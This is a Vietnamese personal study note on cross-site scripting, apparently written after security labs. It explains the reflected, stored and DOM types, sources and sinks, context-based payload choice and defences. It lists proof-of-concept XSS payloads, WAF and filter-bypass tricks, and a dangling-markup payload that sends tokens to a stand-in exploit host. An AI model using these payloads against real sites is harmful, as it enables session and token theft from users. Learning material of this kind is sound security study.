sau khi học phần này, mình hiểu là...
XSS bản chất chỉ có 1 câu thôi.
-> input mình điều khiển được -> nó chui vào response / DOM -> browser thực thi nó như JS.
=> nên mình lúc nào cũng tự hỏi: input nằm ở đâu, nó ra ở đâu, nó có chạy được ko.

- reflected: input -> server -> trả ngay vào response -> browser chạy.
  -> cần dụ nạn nhân click link.
  -> đọc thêm [[reflect XSS]] + [[Xss là gì]].
- stored: input -> server lưu lại -> hiện ở response sau -> ai mở cũng dính.
  -> nguy hiểm hơn reflected vì tự lan.
  -> đọc thêm [[stored xss]].
- DOM: input -> JS phía browser -> sink -> chạy.
  -> server có khi không thấy gì luôn.
  -> đọc thêm [[DOM based Xss]].

ví dụ payload ngắn mình hay dùng để test baseline:
- HTML context: `<script>alert(1)</script>`
- attribute context: `" autofocus onfocus=alert(1) x="`
- innerHTML sink: `<img src=x onerror=alert(1)>`
- href sink: `javascript:alert(1)`
- AngularJS: `{{constructor.constructor('alert(1)')()}}`

source / sink mình hay gặp:
- source: `location.search`, `location.hash`, `document.referrer`, `postMessage`, `document.cookie`.
- sink: `document.write`, `innerHTML`, `outerHTML`, `eval`, jQuery `html()`, `append()`, `attr(href)`, `$()`.
-> sau khi quan sát mấy lab DOM mình thấy... cứ thấy source + sink là 90% có mùi XSS rồi.
-> đọc thêm [[tab source]] + [[các cách phát hiện lỗ hổng XSS]].

context là cái quyết định payload:
- HTML text -> chèn thẻ mới luôn.
- attribute `value="..."` -> phải thoát `"` trước.
- JS string -> phải thoát `";` rồi chèn.
- URL / href -> chèn `javascript:`.
-> đọc thêm [[điểm chung của các loại XSS]] + [[so sánh xss. csrf, sql injection]].

filter bypass, sau khi đọc [[xss-filter bypass]] mình thấy...
- server hay chặn blocklist: `script`, `onerror`, `href`.
-> mình không cố đấm `script` nữa.
-> đổi sang tag lạ + event lạ.
- payload mình hay dùng:
  - `<svg onload=alert(1)>`
  - `<image src=x onerror=alert(1)>`
  - `<svg><animatetransform onbegin=alert(1)>`
  - `<details open ontoggle=alert(1)>`
  - case trộn: `<ScRiPt>alert(1)</ScRiPt>`
  - tách keyword: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- encode thì tùy decoder nào chạy ở đó mới có tác dụng.
-> HTML entity cho HTML, `\u` cho JS, `%3C` cho URL.

CSP + dangling markup:
- CSP chỉ là lớp chặn thêm thôi.
-> nó không sửa lỗi XSS.
-> đọc thêm [[CSP]].
- ví dụ CSP hay gặp: `script-src 'self'`.
-> chặn script ngoài, nhưng không chặn `<img>` hay form.
- nên mình khi bị CSP chặn script -> chuyển sang dangling markup.
-> chèn thẻ chưa đóng để kéo token phía sau gửi về server mình.
-> đọc thêm [[Dangling Markup]].
- payload kiểu: `<img src="//exploit-xxx?` hay `"><img src="//exploit-xxx?`

phòng chống, đọc thêm [[phòng chống xss]]:
- filter input theo allowlist, đừng blocklist.
- encode output đúng context.
  -> HTML -> HTML encode, JS -> JS encode, URL -> URL encode.
- header `Content-Type` + `X-Content-Type-Options: nosniff`.
- CSP để giảm thiệt hại, đừng coi là fix chính.
- DOM thì dùng `textContent` thay `innerHTML`, check protocol `http/https` trước khi gán `href`.

| loại | input đi đâu | cần click link ko | nguy hiểm vì |
|---|---|---|---|
| reflected | response ngay | có | dễ làm PoC, cần delivery |
| stored | lưu DB rồi hiện sau | không | ai mở cũng dính, tự lan |
| DOM | JS browser -> sink | có (URL độc) | server/WAF không thấy |
| dangling | HTML chưa đóng | có | trộm được token dù có CSP |

> [!NOTE] bài học
> - sau khi học xong mình thấy... đừng nhớ payload thuộc lòng.
> -> nhớ flow: source ở đâu => sink / context gì => chọn payload thoát cho đúng.
> - nên mình giờ test lúc nào cũng bắn chuỗi random `x7Kp92Qa` trước.
> -> thấy nó reflected ở đâu rồi mới chọn payload.
